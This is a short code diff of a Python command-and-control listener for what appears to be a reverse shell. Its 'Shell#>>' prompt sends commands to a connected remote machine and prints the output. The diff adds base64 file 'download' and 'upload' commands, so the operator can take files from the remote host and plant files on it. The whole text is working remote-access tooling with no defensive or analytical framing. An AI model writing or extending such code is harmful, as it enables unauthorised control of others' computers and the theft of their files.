@@ -2,6 +2,7 @@
 import socket
 import argparse
 import json
+import base64
 from colorama import Fore, Back, Style
 
 # Main Server function
@@ -37,20 +38,25 @@ def recieve():
 
 # Run Command Function
 def run():
-	while True:
-		command = input('Shell#: ')
+    while True:
+        command = input(Fore.LIGHTBLUE_EX + 'Shell#>> ' + Style.RESET_ALL)
+        ## If there is no command then no execute or processing
+        if not command:
+            continue
+        send(command)
 
-		# if there is no command then no execute or processing
-		if not command:
-			continue
-
-		send(command)
-		if command == 'exit':
-			break
-
-		result = recieve().encode('utf-8')
-		print(result.decode('utf-8'))
-
+        if command == 'exit':
+            break
+        elif command[:8] == 'download':
+            with open(command[9:], 'wb') as f:
+                file_data = recieve()
+                f.write(base64.b64decode(file_data))
+        elif command[:6] == 'upload':
+            with open(command[7:], 'rb') as f:
+                send(base64.b64encode(f.read()))
+        else:
+            result = recieve().encode('utf-8')
+            print(Fore.LIGHTCYAN_EX + f'\n{result.decode('utf-8')}' + Style.RESET_ALL)
 
 
 # Main Function
